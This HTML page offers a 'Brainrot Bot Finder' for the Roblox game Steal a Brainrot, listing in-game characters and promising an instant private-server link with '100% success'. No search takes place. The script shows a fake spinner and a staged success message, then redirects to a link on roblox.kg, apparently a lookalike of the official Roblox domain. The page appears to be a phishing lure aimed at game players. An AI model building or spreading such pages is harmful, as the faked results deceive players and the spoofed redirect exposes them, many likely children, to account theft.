<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Brainrot Bot — Finder</title>
<style>
:root{
  --bg:#000;
  --card:#111;
  --accent:#00ff9d;
  --muted:#aaa;
  --glow:0 6px 24px rgba(0,255,150,0.15);
}
body{
  margin:0;
  font-family:Inter,system-ui,sans-serif;
  background:linear-gradient(180deg,#000 0%,#111 100%);
  color:#fff;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:20px;
}
.app{
  width:100%;
  max-width:1000px;
  background:rgba(255,255,255,0.03);
  border-radius:16px;
  padding:28px;
  border:1px solid rgba(255,255,255,0.08);
  box-shadow:var(--glow);
}
h1{margin:0;font-size:22px}
p.lead{margin:8px 0 0;color:var(--muted);font-size:14px}

.controls{
  display:grid;
  grid-template-columns: 1fr 1fr 1fr;
  gap:16px;
  margin-top:20px;
}
.controls > div{
  display:flex;
  flex-direction:column;
  gap:8px;
}
input, select{
  padding:12px;
  border-radius:10px;
  border:1px solid rgba(255,255,255,0.2);
  background:rgba(255,255,255,0.05);
  color:white;
  font-size:15px;
}
select{
  height:300px;
  cursor:pointer;
}
.mutations{
  display:flex;
  gap:12px;
  flex-wrap:wrap;
  padding:4px 0;
}
.mutations label{
  font-size:13px;
  color:var(--muted);
  display:flex;
  align-items:center;
  gap:5px;
}
button#mainSearch{
  margin-top:20px;
  padding:16px 24px;
  font-size:18px;
  font-weight:700;
  background:linear-gradient(90deg,#00ff9d,#00cc7a);
  color:black;
  border:none;
  border-radius:12px;
  cursor:pointer;
  box-shadow:0 0 30px rgba(0,255,150,0.4);
  transition:transform 0.2s;
}
button#mainSearch:hover{transform:scale(1.05);}
button#mainSearch:active{transform:scale(0.98);}

.info{
  margin-top:20px;
  display:flex;
  flex-wrap:wrap;
  gap:12px;
}
.chip{
  background:rgba(255,255,255,0.07);
  padding:8px 14px;
  border-radius:10px;
  border:1px solid rgba(255,255,255,0.1);
  font-size:14px;
}
.result{
  margin-top:20px;
  padding:20px;
  border-radius:12px;
  background:rgba(255,255,255,0.04);
  border:1px solid rgba(255,255,255,0.1);
  min-height:60px;
  display:flex;
  align-items:center;
  gap:14px;
  font-size:16px;
}
.success{color:#b8ffb8;font-weight:700}
.error{color:#ff6666;font-weight:700}
.spinner{
  width:28px;height:28px;
  border:4px solid rgba(255,255,255,0.1);
  border-top-color:#00ff9d;
  border-radius:50%;
  animation:spin 1s linear infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}

.footer-note{margin-top:16px;color:var(--muted);font-size:13px;text-align:center}

/* Responsive */
@media(max-width:900px){
  .controls{grid-template-columns:1fr;}
  select{height:240px;}
}
</style>
</head>
<body>
<div class="app">
  <header>
    <div>
      <h1>Brainrot Bot Finder</h1>
      <p class="lead">Pick your brainrot → Click the big green button → Instant private server link (100% success)</p>
    </div>
  </header>

  <div class="controls">
    <div>
      <label class="small">Search by name (live filter)</label>
      <input id="searchInput" type="text" placeholder="Type any brainrot name..." />
    </div>

    <div>
      <label class="small">Pick a brainrot</label>
      <select id="brainrotSelect" size="12"></select>
    </div>

    <div>
      <label class="small">Mutations (optional, just for fun)</label>
      <div class="mutations">
        <label><input type="checkbox" class="mut" value="Lava"> Lava</label>
        <label><input type="checkbox" class="mut" value="Rainbow"> Rainbow</label>
        <label><input type="checkbox" class="mut" value="Nyan"> Nyan</label>
      </div>
      <div style="margin-top:20px">
        <button id="mainSearch">SEARCH & GET LINK</button>
      </div>
    </div>
  </div>

  <div class="info">
    <div class="chip" id="selectedName">Selected: —</div>
    <div class="chip" id="selectedRarity">Rarity: —</div>
    <div class="chip" id="selectedIncome">Income/sec: —</div>
    <div class="chip small">Total loaded: <span id="totalCount">0</span></div>
  </div>

  <div class="result" id="resultArea">
    <div id="resultMsg">Select a brainrot and smash the green button!</div>
  </div>

  <div class="footer-note">
    Now with 100% success rate • No more "unavailable" nonsense
  </div>
</div>

<script>
const brainrots = [
  {name:"La Vacca Staturno Saturnita", rarity:"Secret", income:"$250.0K"},
  {name:"Chimpanzini Spiderini", rarity:"Secret", income:"$325.0K"},
  {name:"Agarrini la Palini", rarity:"Secret", income:"$425.0K"},
  {name:"Las Vaquitas Saturnitas", rarity:"Secret", income:"$750.0K"},
  {name:"Pot Hotspot", rarity:"Secret", income:"$2.5M"},
  {name:"Chicleteira Bicicleteira", rarity:"Secret", income:"$3.5M"},
  {name:"La Grande Combinasion", rarity:"Secret", income:"$10.0M"},
  {name:"Los Combinasionas", rarity:"Secret", income:"$63.7M"},
  {name:"Nuclearo Dinossauro", rarity:"Secret", income:"$15.0M"},
  {name:"Garama & Madundung", rarity:"Secret", income:"$50.0M"},
  {name:"Dragon Cannelloni", rarity:"Secret", income:"$100.0M"},
  {name:"Coco Elefanto", rarity:"Brainrot God", income:"$10.0K"},
  {name:"Girafa Celestre", rarity:"Brainrot God", income:"$20.0K"},
  {name:"Gattatino Nyanino", rarity:"Brainrot God", income:"$35.0K"},
  {name:"Matteo", rarity:"Brainrot God", income:"$50.0K"},
  {name:"Tralalero Tralala", rarity:"Brainrot God", income:"$50.0K"},
  {name:"Trenostruzzo Turbo 3000", rarity:"Brainrot God", income:"$150.0K"},
  {name:"Los Tungtungtungcitos", rarity:"Brainrot God", income:"$210.0K"},
  {name:"Piccione Macchina", rarity:"Brainrot God", income:"$225.0K"},
  {name:"Frigo Camelo", rarity:"Mythic", income:"$1.4K"},
  {name:"Avocadorilla", rarity:"Mythic", income:"$7.5K"},
  {name:"Gorillo Watermelondrillo", rarity:"Mythic", income:"$8.0K"}
  // add more if you want
];

const selectEl = document.getElementById('brainrotSelect');
const searchInput = document.getElementById('searchInput');
const resultMsg = document.getElementById('resultMsg');
const mainSearch = document.getElementById('mainSearch');
let currentList = [...brainrots];

function renderList() {
  selectEl.innerHTML = '<option disabled selected value="">— Select a brainrot —</option>';
  const sorted = currentList.sort((a,b) => {
    const rank = {"Brainrot God":3,"Secret":2,"Mythic":1};
    if (rank[b.rarity] !== rank[a.rarity]) return rank[b.rarity] - rank[a.rarity];
    return b.name.localeCompare(a.name);
  });
  sorted.forEach(b => {
    const opt = document.createElement('option');
    opt.value = b.name;
    opt.textContent = `${b.name} — ${b.rarity} — ${b.income}`;
    selectEl.appendChild(opt);
  });
  document.getElementById('totalCount').textContent = sorted.length;
  updateInfo();
}

function updateInfo() {
  const selected = selectEl.value;
  if (!selected) {
    document.getElementById('selectedName').textContent = "Selected: —";
    document.getElementById('selectedRarity').textContent = "Rarity: —";
    document.getElementById('selectedIncome').textContent = "Income/sec: —";
    return;
  }
  const item = brainrots.find(x => x.name === selected);
  if (item) {
    document.getElementById('selectedName').textContent = "Selected: " + item.name;
    document.getElementById('selectedRarity').textContent = "Rarity: " + item.rarity;
    document.getElementById('selectedIncome').textContent = "Income/sec: " + item.income;
  }
}

// Live search
searchInput.addEventListener('input', () => {
  const q = searchInput.value.trim().toLowerCase();
  currentList = brainrots.filter(b => b.name.toLowerCase().includes(q));
  renderList();
});

// Update info when selection changes
selectEl.addEventListener('change', updateInfo);

// MAIN SEARCH BUTTON (100% success)
mainSearch.addEventListener('click', () => {
  if (!selectEl.value) {
    resultMsg.innerHTML = '<span class="error">❌ Pick A Brainrot first!</span>';
    return;
  }

  const name = selectEl.value;
  resultMsg.innerHTML = `
    <div class="spinner"></div>
    <div>Teleporting to <strong>${name}</strong> private server...</div>
  `;

  setTimeout(() => {
    resultMsg.innerHTML = `<span class="success">✅ SUCCESS! Opening private server for <strong>${name}</strong>!</span>`;
    setTimeout(() => {
      window.location.href = "https://roblox.kg/games/109983668079237/Steal-a-Brainrot?privateServerLinkCode=09292145405019956057673779063122";
    }, 1200);
  }, 1800);
});

// Init
renderList();
</script>
</body>
</html>
